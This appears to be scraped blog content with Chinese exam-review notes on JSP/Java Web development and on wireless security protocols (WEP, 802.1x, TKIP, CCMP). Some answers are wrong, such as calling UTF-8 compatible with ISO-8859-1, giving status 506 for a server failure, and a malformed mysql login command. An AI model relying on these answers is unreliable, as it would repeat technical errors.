flower);&#125;%&gt;&lt;/body&gt;&lt;/html&gt; 本页面既当客户端提交表单页面，又当服务器端接收表单页面 虽然输入框被隐藏了，客户端无法输入值，但还是可以传值到接收页面； 类型为普通按钮button是无法向接收页面提交表单信息，submit才能提交 post方法是将表单内各字段与其内容以键-值对放在http报文的哪个部分？（） http请求报文的实体主体部分 Get方法是将传值内容以键值对放在http请求报文请求行的URL字段 Post方法是将传值内容以键值对放在http请求报文的实体主体部分 如果现在因为服务器故障而无法返回请求的页面，返回状态码506 varlant also negotiates 2xx 表示成功 204 No Content 表示服务器成功处理请求，但不需要返回任何实体内容 3xx 表示重定向，完成请求后还需要进一步采取措施。 304 Not Modified 表示客户端发送了一个带条件的GEt请求，文档内容没被改变 4xx 表示客户的差错 5xx 表示服务器的差错 UTF-8 中文字符使用24位编码，英文字符使用8位编码，兼容ASCII和ISO-8859-1。不兼容中文字符使用16位编码的GB232&#x2F;GBK。 Unicode 中文字符和英文字符使用16位或32位编码，不兼容GBK GB2312 中文字符使用16位编码，英文字符使用8位编码，兼容ISO-8859-1 ISO-8859-1 使用8位编码，无法显示中文字符，兼容ASCII 现有tomcat服务器配置文件server.xml部分内容，及客户端提交表单页面a.jsp，和服务器端表单接收页面b.jsp，客户提交表单后中文显示乱码，请用以下哪种办法可以正确显示中文字符。 123456789101112131415161718192021222324252627282930313233343536373839404142434445Server.xml&lt;Connector connectionTimeout=&quot;20000&quot; port=&quot;8080&quot; protocol=&quot;HTTP/1.1&quot; redirectPort=&quot;8443&quot; URIEncoding=&quot;gbk&quot;/&gt;a.jsp&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=ISO-8859-1&quot;%&gt;&lt;html&gt; &lt;body&gt; &lt;form action=&quot;b.jsp&quot; method=&quot;get&quot;&gt; 请您输入学生的模糊资料：&lt;BR&gt; &lt;input name=&quot;stuname&quot; type=&quot;text&quot;&gt; &lt;input type=&quot;submit&quot; value=&quot;查询&quot;&gt; &lt;/form&gt; &lt;/body&gt;&lt;/html&gt;b.jsp&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=gb2312&quot;%&gt;&lt;html&gt; &lt;body&gt; &lt;% String stuname = request.getParameter(&quot;stuname&quot;); out.println(&quot;输入的查询关键字为:&quot; + stuname); %&gt; &lt;/body&gt;&lt;/html&gt; 改a.jsp里代码charset=gb2312; 改b.jsp里的代码 charset=utf-8 post方法传值键-值对在请求报文实体主体部分，默认用iso-8859-1编码，可以在接收页面转码交给服务器。 get方法传值键-值对在请求报文请求行的URL字段，默认用iso-8859-1编码，需要在客户提交页面转码交给服务器 第六章 如果远程MySQL数据库服务器的IP地址是202.115.128.123，进入此服务器MySQL命令行客户端管理工具的命令为（）。 1mysql -h 202.115.128.123 root -p 查询结果集ResultSet是以统一的行列形式组织数据，执行“ResultSet rs=stat.executeQuery(“select bid,name,author,publish,price from book”);”语句，得到的结果集rs的列数为（）。 5 向数据库添加数据，可以获得成功添加条数的方法是（）。 A. executeUpdate() ✅ B. getString() C. createStatement() D. executeQuery() executeQuery() 发送查询SQL语句，返回结果集。 createStatement() 与数据库建立连接，打开数据库。 executeUpdate() 返回一个整型，意思为这条sql语句执行受影响的行数，即成功添加的条数。 在游标的控制中，以下部分代码能实现倒序奇数行记录输出的是（）。 C. ✅ 123456rs.afterLast();while(rs.previous())&#123; int i=rs.getRow(); if(i%2&lt;&gt;0)&#123;……&#125;……&#125; rs.afterLast() 将游标移到结果集的最后一行之后。 rs.last() 将游标移到结果集的最后一行。 rs.befortFirst() 将游标移到结果集的第一行之前。 if(i%2==0) 判断是否为偶数。 if(i%2==1) 判断是否为奇数。 if(i%2&lt;&gt;0) 判断是否为奇数。 关于连接池的使用，下面描述正确的是（）。 在连接池集合中创建连接对象可以使用add()方法 设定连接池最大连接数可以防止用户无限制地与数据库连接。 使用完连接对象放回连接池数组 add() 从连接池数组中取出一个连接对象remove() 第七章 现有部分有关JSP缓存与Servlet缓存代码段，请问页面输出结果为（ 胜 战病！毒）。 12345678&lt;% out.print(&quot;战&quot;); response.getWriter().print(&quot;胜&quot;);out.print(&quot;病&quot;); out.flush();out.print(&quot;毒&quot;);response.getWriter().print(&quot;！&quot;); %&gt; out对象先输出到JSP缓存再到Servlet缓存最后到页面。 response.getWriter()直接输出到Servlet缓存再到页面。 （1）out.print(“战”);&#x2F;&#x2F;将“战”输出到JSP缓存 （2）response.getWriter().print(“胜“); &#x2F;&#x2F;将“胜”输出到Servlet缓存，最先输出到页面的是“胜”。 （3）out.print(“病”); &#x2F;&#x2F;将“病”输出到JSP缓存，排在“战”后面，JSP缓存队列为“战、病”。 （4）out.flush(); &#x2F;&#x2F;手动刷新JSP缓存并将“战、病”输出到Servlet缓存，排在“胜”的后面，现在Servlet缓存队列为“胜、战、病“。 （5）out.print(“毒”); &#x2F;&#x2F;将“毒“输出到JSP缓存，现在JSP缓存队列为”毒“。 （6）response.getWriter().print(“！”); &#x2F;&#x2F;将“！“输出到Servlet缓存，现在Servlet缓存队列为“胜、战、病、！“。 | （7）程序结束JSP缓存输出到Servlet缓存，现在Servlet缓存队列为“胜、战、病、！、毒“，最后输出到客户端页面。 现有部分代码如下，出现错误提示为“java.lang.NumberFormatException: null”，请帮同学解决问题（） 123456789101112131 &lt;%2 for (int i = 1; i &lt; 10; i++) &#123;3 %&gt;4 &lt;a href=&quot;05_1.jsp?num=&lt;%=i%&gt;&quot;&gt;&lt;%=i%&gt;&lt;/a&gt;&lt;br&gt;5 &lt;%6 &#125;7 %&gt;8 &lt;%9 String numstr = null;10 numstr = request.getParameter(&quot;num&quot;);11 int num1 = Integer.parseInt(numstr);12 %&gt;13 该数字的平方为&lt;%=num1*num1%&gt; 在第11行和第13行后分别加入if(numstr ! = null)&#123; 和 &lt;%&#125;%&gt; 获取数据时出现空值，所以做一个非空判断 有如下程序片段： 1234&lt;form&gt; &lt;input type=”text” name=”number”&gt; &lt;input type=”submit” value=”提交”&gt;&lt;/form&gt; 下面（）语句可以获取用户输入的信息。 request.getParameter(&quot;number&quot;); response 内置对象是对客户的请求做出响应，向客户端发送数据的。 request 得到客户端的请求信息session 保存同一客户端一次会话过程中的一些信息application 表示整个应用的环境信息response 向客户端发出响应 现有a.jsp、b.jsp、c.jsp三个页面，如果运行a.jsp页面在“输入学生姓名：”输入框内输入Rose，点击查询按钮以后页面会显示什么内容（）。 输入学生姓名是：null 1234567891011a.jsp&lt;%@ page language=&quot;java&quot; import=&quot;java.util.*&quot; contentType=&quot;text/html; charset=gb2312&quot; %&gt; &lt;html&gt; &lt;body&gt; &lt;form action=&quot;b.jsp&quot;&gt; 输入学生姓名：&lt;input type=&quot;text&quot; name=&quot;stuname&quot;&gt; &lt;input type=&quot;submit&quot; value=&quot;查询&quot;&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; 123456789b.jsp&lt;%@ page language=&quot;java&quot; import=&quot;java.util.*&quot; contentType=&quot;text/html; charset=gb2312&quot; %&gt; &lt;html&gt; &lt;body&gt; &lt;% response.sendRedirect(&quot;c.jsp&quot;); %&gt; &lt;/body&gt; &lt;/html&gt; 12345678910c.jsp&lt;%@ page language=&quot;java&quot; import=&quot;java.util.*&quot; contentType=&quot;text/html; charset=gb2312&quot; %&gt; &lt;html&gt; &lt;body&gt; &lt;% out.println(&quot;输入学生姓名是：&quot;+request.getParameter(&quot;stuname&quot;)+&quot;&lt;br&gt;&quot;); %&gt; &lt;/body&gt; &lt;/html&gt; 如果想让else程序段内容成功跳转到b.jsp页面，请补全代码（）。 1234567891011121314151617181920&lt;%String name=request.getParameter(&quot;userName&quot;);String password=request.getParameter(&quot;pwd&quot;);if(&quot;zhangsan&quot;.equals(name)&amp;&amp;&quot;123&quot;.equals(password))&#123;out.print(&quot;成功登陆，3秒钟后进入loginSuccess.jsp页面&quot;);response.setHeader(&quot;refresh&quot;, &quot;3;url=a.jsp&quot;);return;&#125;else&#123;&#125;-----------------%&gt; %&gt;&lt;jsp:forward page=&quot;b.jsp&quot;/&gt;&lt;% 现有cookie相关部分代码如下，请问当前cookie的有效时间为（）。 关闭浏览器时失效 12345678&lt;% String str=&quot;12&quot; ; int number=Integer.parseInt(str); %&gt; 该数字的平方为：&lt;%=number*number %&gt; &lt;HR&gt; &lt;% Cookie cookie=new Cookie(&quot;number&quot;,str); cookie.setMaxAge(-10); response.addCookie(cookie); %&gt; &lt;a href=&quot;b.jsp&quot;&gt;到达p2&lt;/a&gt; cookie.setMaxAge(int time) 设置存活时间 time正整数，表示存活的秒数 time负数，代表临时cookie，浏览器关闭时失效 time 0 ，表示通知浏览器删除相应的cookie对象 第八章 在JSP中保存用户会话信息使用（ session ）对象。 如果选择一个对象保存聊天室信息，则选择（ application ）。 哪个方法是保存session中关键字是key的对象 1public void setAttibute(String key,Object obj) 现有以下部分代码段，主要功能可以实现将物品添加到购物车，请补全代码。 123456789101112&lt;form action=&quot;order.jsp&quot; method=&quot;post&quot;&gt; 三国演义&lt;input name=&quot;goods&quot; type=&quot;hidden&quot; value=&quot;三国演义&quot;&gt; &lt;input type=&quot;submit&quot; value=&quot;添加到购物车&quot;&gt;&lt;/form&gt;&lt;% ArrayList good=(ArrayList) session. ① if(good==null)&#123; good=new ArrayList(); session. ② &#125;else&#123; String goods=request. ③ if(godd!=null)&#123; goods=new String(goods.getBytes(&quot;ISO-8859-1&quot;),&quot;gb2312&quot;); good.add( ④ ); &#125; &#125; %&gt; ① getAttribute(“good”); &#x2F;&#x2F;读取购物车 ② setAttribute(“good”,good) &#x2F;&#x2F;存入购物车，session对象 ③ getParameter(“good”) &#x2F;&#x2F;获取表单里文本框属性名 ④ goods &#x2F;&#x2F;将goods的值存入good对象 通过相关方法输出session对象的生存期限第一次访问当前web服务的参数如图所示，如果现在经过20秒第二次访问此页面，下面哪些参数会发生变化（）。 超过发呆时间，第二次访问页面，session的创建时间、ID、上一次请求时间都会发生变化 使用pageContext内置对象可以操作当前JSP页面的所有其他内置对象，现有如下代码段，请问页面最后输出的结果（）。 123456789101112131415161718&lt;% application.setAttribute(&quot;applicationKey&quot;, &quot;applicationKey&quot; ); String applicationValue=(String)pageContext.getAttribute(&quot;applicationKey&quot;,4); session.setAttribute(&quot;sessionKey&quot;, &quot;sessionKey&quot; ); String sessionValue=(String)pageContext.getAttribute(&quot;sessionKey&quot;,3); request.setAttribute(&quot;requestKey&quot;, &quot;requestKey&quot; ); String requestValue=(String)pageContext.getAttribute(&quot;requestKey&quot;,2); pageContext.setAttribute(&quot;pageKey&quot;, &quot;pageKey&quot; ); String pageValue=(String)pageContext.getAttribute(&quot;pageKey&quot;,1); pageContext.removeAttribute(&quot;requestKey&quot;,2); pageContext.removeAttribute(&quot;applicationKey&quot;,4); pageContext.setAttribute(&quot;applicationKey&quot;,&quot;Java Web&quot;,4); %&gt; 页面域的范围scope：&lt;%=pageContext.getAttributesScope(&quot;pageKey&quot;)%&gt;&lt;br&gt; 请求域的范围scope：&lt;%=pageContext.getAttributesScope(&quot;requestKey&quot;)%&gt;&lt;br&gt; 会话域的范围scope：&lt;%=pageContext.getAttributesScope(&quot;sessionKey&quot;)%&gt;&lt;br&gt; 应用域的范围scope：&lt;%=pageContext.getAttributesScope(&quot;applicationKey&quot;)%&gt;&lt;br&gt; 选项D： pageContext.removeAttribute(“requestKey“;,2); &#x2F;&#x2F;从scope范围2移除关键字 requestKey的属性对象，最终打印scope值为0。 pageContext.removeAttribute(“applicationKey“;,4); &#x2F;&#x2F;从scope范围4移除关键字为applicationKey的属性对象。 pageContext.setAttribute(“applicationKey”,”Java Web”,4); &#x2F;&#x2F;以K&#x2F;V对的方式存储scope范围域4属性对象值”Java Web”，最终打印scope值为4. 页面域的范围scope：1 请求域的范围scope：0 会话域的范围scope：3 应用域的范围scope：4 现在分别用页面域、会话域和应用域制作访问统计，现在用IE浏览器访问页面结果如图所示。请问现在用Chrome浏览器访问此页面后显示结果为（） 页面域访问统计：1 会话域访问统计：1 应用域访问统计：13 页面域（page scope），它的生命周期是指页面执行期间。存储在页面域的对象只能在它所在页面被访问，作用范围当前页面。相同或不同浏览器（用户）的计数变量不能共享，没有计数功能。 会话域（session scope），它的生命周期是指某个客户端与服务器所连接的时间。客户端在第1次访问服务器时创建会话，在会话过期或用户主动退出后，会话结束。存储在会话域中的对象在整个会话期间（可以包含多次请求）都可以被访问。不同浏览器（用户）的计数变量不能共享，只能计数同一浏览器（用户）的访问统计。 应用域（application scope），它的生命周期是指从服务器开始执行服务到服务器关闭为止。存储在应用域中的对象在整个应用程序运行期间可以被所有JSP和Servlet共享访问。可以计数所有访问本页面的浏览器（用户）数。 第九章 某个文件名为SecondServlet.java的servlet文件，在服务器部署映射，以下哪个url-pattern能够成功（）。 &lt;url-pattern&gt;/5.1&lt;/url-pattern&gt; servlet的url-pattern映射规则要以&#x2F;开头，&#x2F;*.java 属于扩展映射，&#x2F;和扩展映射同时使用会出现语法错误； &#x2F;5.1属于精确路径映射，可以部署成功。 下列Servlet方法中，（）方法在Servlet生命周期中，Servlet每请求一次它就会被调用一次。 service() init() 载入时被执行，且只执行一次，对servlet进行初始化 service() 请求服务，请求一次执行一次 destroy() 服务器关闭时被调用，且只执行一次，用来释放servlet所占资源 close()不属于servlet 生命周期方法 关于servlet使用JSP内置对象，现有部分代码如下，请问在客户端页面会显示什么内容（）。 123456789101112131415protected void doPost(HttpServletRequest request,HttpServletResponse response) throws ServletException, IOException &#123;response.setContentType(&quot;text/html;charset=gb2312&quot;);request.setCharacterEncoding(&quot;gb2312&quot;);out.println(&quot;五一&quot;);System.out.println(&quot;劳动节&quot;);response.getWriter().println(“快乐！”);&#125; 会编译错误 out.println(“五一“); &#x2F;&#x2F;out对象在servlet里使用需要先声明PrintWriter out = response.getWriter();否则会出现编译错误。 System.out.println(“劳动节“); &#x2F;&#x2F;在JSP和servlet都可以输出到客户端的控制台，不能输出到客户端页面。 response.getWriter().println(“快乐！”); &#x2F;&#x2F;在JSP和servlet都可以输出到客户端页面。 现有a.jsp、B.java和C.java文件，B.java文件获取客户端a.jsp的表单传值，并将获取到的值传递到C.java后正确显示在客户端页面，请补全代码（）。 b.java部分代码段如下： 123456789101112131415protected void doPost(HttpServletRequest request,HttpServletResponse response) throws ServletException, IOException &#123;request.setCharacterEncoding(&quot;gb2312&quot;);String b = request.getParameter(&quot;a&quot;);if (b.length() &gt; 0) &#123;① request.getRequestDispatch(&quot;C).forward(request,response);&#125;&#125; request.getRequestDispatcher(“C”).forward(request, response); &#x2F;&#x2F;转发，通过forward方法把当前页面的request对象里的数据转发到C页面，getRequestDispatcher(“C”)。 response.sendRedirect(“C”); &#x2F;&#x2F;重定向，无法从以前的request对象中获取用户提交的数据。 response.encodeRedirectURL(“C”); &#x2F;&#x2F;URL重写，数据有丢失无法获取。 forward(request, response); &#x2F;&#x2F;语法错误。 在web服务器test目录下有一客户端a.jsp文件，代码如下所示。在B.java文件设置字符过滤器，下面注解方式能使程序正常运行并解决中文乱码的为（）。 1234567891011&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=gb2312&quot;%&gt;&lt;form action=&quot;B&quot; method=&quot;post&quot;&gt;请输入学生信息的模糊资料：&lt;input type=&quot;text&quot; name=&quot;stuname&quot;&gt;&lt;br&gt;&lt;input type=&quot;submit&quot; value=&quot;查询&quot;&gt;&lt;/form&gt; 123@WebFilter(filterName = &quot;setCharacterEncodingFilter&quot;,urlPatterns = &#123; &quot;/test/a.jsp&quot;&#125;, initParams = &#123;@WebInitParam(name = &quot;encoding&quot;, value = &quot;GBK&quot;)&#125;) urlPatterns &#x3D; { “&#x2F;test&#x2F;a.jsp” ; } &#x2F;&#x2F;精确匹配拦截服务器下test目录的a.jsp客户端请求。 value &#x3D; “GBK”; 与客户端charset&#x3D;gb2312编码兼容。 现在为Web服务器设置监听session中某个对象状态变化，下面能实现将session对象持久化到存储设备上的方法为（）。 1sessionWillPassivate(HttpSessionEvent se) HttpSession中对象的状态有：绑定→解除绑定，钝化→活化。 valueBound(HttpSessionBindingEvent event) &#x2F;&#x2F;绑定，当对象被放到session里时，执行此方法。 valueUnbound(HttpSessionBindingEvent event) &#x2F;&#x2F;解除绑定，当对象被从session里移除时，执行此方法。 sessionWillPassivate(HttpSessionEvent se) &#x2F;&#x2F;钝化，当session里的对象被钝化时，执行此方法。 sessionDidActivate(HttpSessionEvent se) &#x2F;&#x2F;活化，当对象被重新加载（活化）时，执行此方法。 第十章 以下代码定义了一个JavaBean类Student.java，请问哪些行没有遵循有关约定（）。 123456789101112131 package bean;2 private class Student &#123; ❌3 private String stuname;4 public String getstuname() &#123; ❌ 5 return stuname;&#125;6 public void setterStuname(String stuname) &#123; ❌7 this.stuname = stuname;&#125;&#125; 1.JavaBean应该是public类，且具有无参数的public构造方法。也可以定义带参数构造方法。 2.类的成员变量一般称为属性（property），对每个属性访问权限一般定义为private，属性名必须以小写字母开头。 3.每个属性通常定义两个public方法，一个是访问方法（getter），一个是修改方法（setter），使用它们访问和修改JavaBeans的属性值，对应的变量首字母必须大写。 第2行：public class Student{&#x2F;&#x2F;应该是public类。 第4行：public String getStuname(){&#x2F;&#x2F;访问方法getter对应的变量首字母必须大写。 第6行：public void setStuname(String stuname){&#x2F;&#x2F;修改方法setter，应该是setStuname(String stuname)。 如果已经在包bean里正确定义了一个JavaBean类Rose.java，通过以下JSP代码能不能正确访问bean，如果不能以下哪项修改是正确的（）。 12345678910111 &lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=gb2312&quot;%&gt;2 &lt;jsp:useBean id=&quot;rose&quot; type=&quot;bean.Rose&quot; scope=&quot;session&quot;/&gt;3 &lt;p&gt;矩形的长是：&lt;%=rose.getLength()%&gt;4 &lt;p&gt;矩形的宽是：&lt;%=rose.getWidth()%&gt;5 &lt;p&gt;矩形的面积是：&lt;%=rose.computerArea()%&gt;6 &lt;p&gt;矩形的周长是：&lt;%=rose.computerLength()%&gt; type属性必须保证bean实例存在，如果找到用rose指向它，如果找不到产生Instantiation异常，beanName&#x3D;”bean.Rose”;可以动态实例化。 第2行加入动作标记useBean属性beanName即可：。 不能访问bean，应该在第2行加入动作标记useBean属性；beanName = &quot;bean.Rose&quot; 下面语句与&lt;jsp:getProperty name=”tom” property=”jerry”/&gt;等价的是（） &lt;%out.print(tom.getJerry());%&gt; 关于jsp:setProperty和jsp:getProperty标记的描述以下正确的是（）。 这两个标记的name属性值必须与&lt;jsp:useBean&gt;标记的id属性值相对应 student.jsp文件代码如下，要使student一直存在于会话中，直到终止或被删除为止，请补全代码（）。 12345678910111213141516&lt;%@ page language=&quot;java&quot; contentType=&quot;text/html; charset=gb2312&quot; %&gt; &lt;jsp:useBean id=&quot;student&quot; class=&quot;bean.Student&quot; scope=&quot; ___session______ &quot; /&gt; &lt;jsp:setProperty property=&quot;stuname&quot; name=&quot;student&quot; value=&quot;rose&quot; /&gt; &lt;html&gt; &lt;body&gt; 学生姓名： &lt;jsp:getProperty name=&quot;student&quot; property=&quot;stuname&quot; /&gt; &lt;/body&gt; &lt;/html&gt; page页面域，request请求域，session会话域，application应用域。 第十二章 关于AJAX技术相关特点，描述正确的是（）。 可以促进页面呈现和数据本身分离 减轻服务器负担，避免整个浏览器窗口刷新时造成的重复请求。 对浏览器具有一定的限制，对于不兼容的浏览器，可能无法使用。 AJAX没有刷新页面，浏览器上的“后退”按钮是失效的，不能退回。 现有以下部分JS代码段，用户使用IE5浏览器能否实现异步免刷新网页，如果不能应该如何修改（）。 1234567891011121 &lt;SCRIPT LANGUAGE=&quot;JavaScript&quot;&gt;2 function showInfo()&#123;3 var xmlHttp=new XMLHttpRequest(); 4 xmlHttp.open(&quot;POST&quot;, &quot;a.jsp&quot;, true); 5 xmlHttp.onreadystatechange=function() &#123; 6 if (xmlHttp.readyState==4) &#123; 7 infoDiv.innerHTML = xmlHttp.responseText;8 &#125;9 &#125;10 xmlHttp.send(); 11 &#125;12 &lt;/SCRIPT&gt; 不能实现异步免刷新网页，第三行改为 1var xmlhttp = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;) 所有现代浏览器（IE7+、Firefox、Chrome、Safari 以及 Opera）均支持XMLHttpRequest 对象var xmlHttp&#x3D;new XMLHttpRequest(); 老版本的Internet Explorer（IE5 和 IE6）使用ActiveXObject对象, var xmlhttp = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;) 部分分析HTTP请求和响应的服务器状态JS代码如下，当处于初始化状态时在客户端页面上打印的readyState属性值为（）。 不会有打印数据 123456789101112131415161718192021&lt;SCRIPT LANGUAGE=&quot;JavaScript&quot;&gt; var xmlHttp = new ActiveXObject(&quot;Msxml2.XMLHTTP&quot;); function showInfo() &#123; xmlHttp.open(&quot;GET&quot;, &quot;c.jsp&quot;, true); xmlHttp.onreadystatechange = showState; xmlHttp.send(); &#125; function showState() &#123; document.writeln(xmlHttp.readyState); &#125;&lt;/SCRIPT&gt; 服务器在初始化状态时还没有和客户端建立连接，无法收到客户端Http请求，所以不会执行showState函数，不会有打印数据在客户端页面。 使用AJAX技术跳转到a.jsp页面部分代码段如下，服务器响应返回客户端的代码为infoDiv.innerText &#x3D; xmlHttp.responseText;请问最后客户端页面输出内容为（）。 1234567891011a.jsp&lt;table&gt; &lt;tr&gt; &lt;th&gt;地址：&lt;br&gt;成都理工大学&lt;/th&gt; &lt;/tr&gt;&lt;/table&gt; 输出内容为 123456789&lt;table&gt; &lt;tr&gt; &lt;th&gt;地址：&lt;br&gt;成都理工大学&lt;/th&gt; &lt;/tr&gt;&lt;/table&gt; infoDiv.innerText属性，表示在该div内显示内容时，不考虑其中的HTML格式的标签，所有标签都不会解释并原样输出。 部分JSON代码如下，请问在客户端弹出窗口输出的内容依次为（）。 123456789101112131415161718192021222324252627function opJSON()&#123;var stu = &#123;&quot;sno&quot;:&quot;20190101&quot;,&quot;sname&quot;:&quot;Tom&quot;,&quot;hobby&quot;:[&quot;篮球&quot;,&quot;足球&quot;,”排球”],&quot;college&quot;:&#123;&quot;cname&quot;:&quot;成都理工大学&quot;,&quot;city&quot;:&quot;成都&quot;&#125;&#125;;alert(stu.sname);alert(stu.hobby[3]);alert(stu.college.city);&#125; 输出：Tomundefined成都 数组从0开始，hobby[3]是没有的，因为篮球足球排球是012 实验第十章12345678910111213141516171819202122232425262728293031323334353637383940414243package Bean;//库为Bean//题目：编写一个JavaBean“Book.java”// 它含有属性bookid(String)、bookname(String)、bookprice(double)，// 并编写getter、setter参数。//解析如下：//javabean中不仅要定义成员变量，还有对每一个成员变量定义一个getter方法和setter方法。//成员变量必须是private的，getter和setter函数必须是public的//getter和setter方法读/写变量的值，对应变量的首字母必须大写，如下列函数名：// setBookid()/getBookid()、 setBookname()/getBookname()、setBookprice()/getBookprice()public class Book &#123; private String bookid ; private String bookname; private Double bookprice; //javabean中，成员变量必须是private的，getter和setter函数必须是public的 //下面两个是变量bookid的setter和getter函数。 public void setBookid(String bookid)&#123; this.bookid=bookid;//设置bookid的值 return; &#125; public String getBookid()&#123; return bookid; &#125;//获取bookid的值 //下面两个是变量bookname的setter和getter函数。 public void setBookname(String bookname)&#123; this.bookname=bookname;//设置bookname的值 return; &#125; public String getBookname()&#123; return bookname; &#125;//获取bookname的值 //下面两个是变量bookprice的setter和getter函数。 public void setBookprice(Double bookprice)&#123; this.bookprice=bookprice;//设置bookprice的值 return ; &#125; public Double getBookprice()&#123; return bookprice; &#125;//获取bookprice的值&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152package Bean;//2：编写一个JavaBean&quot;Customer.java&quot;，// 它含有属性account(String)、password(String)、cname(String)，// 给这个JavaBean增加属性member(boolean类型，表示是否为会员），并编写相应函数，即setter/getter函数。//解析如下：//javabean中不仅要定义成员变量，还有对每一个成员变量定义一个getter方法和setter方法。//成员变量必须是private的，getter和setter函数必须是public的//getter和setter方法读/写变量的值，对应变量的首字母必须大写，如下列函数名：// setAccount()/getAccount()、 setPassword()/getPassword()、setCname()/getCname()//对于特殊的布尔型的成员变量member，需要把getter方法的函数设置为以is开头的，本例中设置为isMember().public class Customer &#123; private String account; private String password; private String cname; private boolean member; //下面两个是变量account的setter和getter函数。 public void setAccount(String account)&#123; this.account=account; return; &#125; public String getAccount()&#123; return account; &#125; //下面两个是变量password的setter和getter函数。 public void setPassword(String password)&#123; this.password=password;return; &#125; public String getPassword()&#123; return password; &#125; //下面两个是变量cname的setter和getter函数。 public void setCname(String cname)&#123; this.cname=cname;return; &#125; public String getCname()&#123; return cname; &#125; //下面两个是变量member的setter和getter函数。 public boolean isMember()&#123; return member; &#125; public void setMember(boolean member)&#123; this.member=member; &#125;&#125;","categories":[{"name":"期末考试","slug":"期末考试","permalink":"https://gryffinbit.top/categories/%E6%9C%9F%E6%9C%AB%E8%80%83%E8%AF%95/"},{"name":"WEB应用开发","slug":"期末考试/WEB应用开发","permalink":"https://gryffinbit.top/categories/%E6%9C%9F%E6%9C%AB%E8%80%83%E8%AF%95/WEB%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91/"}],"tags":[{"name":"考点","slug":"考点","permalink":"https://gryffinbit.top/tags/%E8%80%83%E7%82%B9/"}],"author":"Gryffinbit"},{"title":"无线网络安全期末考点","slug":"无线网络安全期末考点","date":"2021-06-09T16:40:31.000Z","updated":"2024-08-27T02:28:09.000Z","comments":true,"path":"2021/06/10/无线网络安全期末考点/","permalink":"https://gryffinbit.top/2021/06/10/%E6%97%A0%E7%BA%BF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%9C%9F%E6%9C%AB%E8%80%83%E7%82%B9/","excerpt":"","text":"精简版题型1、2、3、6、8章一个大题 第一章无线局域网的标准 802.11 无线网络安全、有线网络安全的区别 开放性 无线网络开放性更好，容易被窃听或主动干扰等攻击 有线网络有确定的边界，通过对端口的管理，能有效地控制非法用户的接入。 移动性 无线网络移动性使管理难度变大 有线网络不能在大范围内移动，管理容易 健壮性 无线网络传输不稳定，健壮性差 有线传输环境固定，信号质量稳定 灵活性 无线网络更灵活，但是要更加信任的关系 有线网络灵活性不好，但是安全性更好 拓扑结构 无线网络动态变化的拓扑结构，安全技术和方案部署难 有线网络固定的拓扑结构，安全技术和方案部署容易 设备 无线网络设备① 更容易被物理攻击。 ② 可能存在假AP。 ③ 资源受限 有线网络设备，路由器、防火墙等，不容易被物理攻击 第二章WEP 名词解释： WEP (Wired Equivalent Privacy) 有线等效保密 STA：移动站、AP：无线接入点 IV (Initialized Vector) 初始化矢量 C 密文、P 明文、Key 密钥 ICV (Integrity Check Value) 完整性校验和 RC4 (Rivest Cipher 4) 对称加密算法，流加密算法 WEP设计思想： 机密性：RC4序列密码 可用性：Station与AP共享同一密钥实施接入控制； 完整性：CRC-32循环冗余校验值 加密方式：$$ RC4（IV,key)\\bigoplus（P,ICV） $$ 计算明文数据的CRC-32冗余校验码和明文一起构成传输载荷。 Station和AP共享密钥Key。选定一个初始化矢量IV 将IV和Key连接起来构成种子密钥，送入RC4算法的伪随机数生成器，产生密钥流 加密密钥流与传输载荷异或，构成密文C 解密方式：$$ （P,ICV）&#x3D;C\\bigoplus RC4（IV,key) $$ IV明文形式和C一起发送 接收方从数据包提取IV和C，将IV和key一起送入RC4伪随机数生成器，得到解密密钥流 解密密钥流和C异或，得到明文P和CRC校验和ICV WEP规定了两种认证方式 开放系统认证 不进行用户认证，任何接入WLAN的请求都被允许 共享密钥认证 通过检验AP和Station是否共享同一密钥来实现的（WEP加密密钥） 802.1x协议 基于端口的访问控制协议 定义了两类协议接入实体 认证请求者 认证者 体系结构里分了三个组成部分 申请者系统 认证者系统 认证服务器 认证者系统对应于不同用户的端口，有两个逻辑端口 受控端口：只在认证通过的状态下才打开，用于传递网络资源和服务 非受控端口：始终处于双向连通状态，主要用于传送与认证相关的数据帧。 802.1x的认证流程 申请者发出请求认证报文EAPOL-start 认证者收到消息后向申请者发送EAP-Request&#x2F;Identity，要求提供认证信息 申请者响应请求，发送用户名信息给认证者。 认证者将数据封包处理发给认证服务器。 认证服务器收到后，与数据库中的用户名表进行对比，找到对应口令信息并随机生成加密字，传给认证者 申请者收到认证者传来的加密字后，用其对口令部分加密，交给认证者。 认证者再传给认证服务器 认证服务器收到后，与自己经加密后的口令进行对比。把反馈信息给认证者。 认证者发出打开端口的指令，告知业务流可通过端口访问。否则失败。端口关闭 用户要求断开网络时，发送断网请求。认证者把端口设置为非授权状态 802.1x认证特点 协议实现简单，二层协议，对设备性能要求不高 采用受控端口和不受控端口的逻辑功能，将业务与认证分离，简化了复杂过程，提高了封装效率 不对称协议，只能网络鉴别用户，不能双向鉴别，有安全隐患 WAPI协议（大概了解概念） 基于公钥技术实现基站和访问接入点两者的身份验证 合法的用户接入合法的网络 分为无线局域网鉴别基础结构和无线局域网保密基础结构 802.11 i 协议 RSN的概念 （Robust Security Network）强健网络安全，这样做的目的是为了提高无线网络的安全性。 TKIP (Temporal Key Integrity Protocol) 临时秘钥完整性协议 用加密混合函数来处理初始向量过弱或空间过小的问题。 RC4流加密，密钥长度128，解决WEP密钥过短的问题 CCMP (CTR with CBC-MAC Protocol) 对称密钥块密码模式。 在AES的CCM模式上改进来的。 使用AES块加密算法 取代TKIP和WEP。 因为AES加密算法是和处理器相联系的，所以旧的设备中可以支持WEP和TKIP，但是不能支持CCMP&#x2F;AES加密 TKIP和CCMP区别 TKIP基于RC4。CCMP基于AES算法，需要硬件支持 TKIP和WEP关系 TKIP用以在不需要升级硬件的基础上替代WEP协议，升级加密的安全性。 TKIP是对已经使用了WEP的设备进行一个过度，增强安全性 TKIP解决WEP密钥过短的问题 TKIP解决WEP初始向量过弱、向量空间过小 TKIP、WEP、CCMP区别关系 WEP、TKIP是RC4流密码，CCMP是AES对称密码 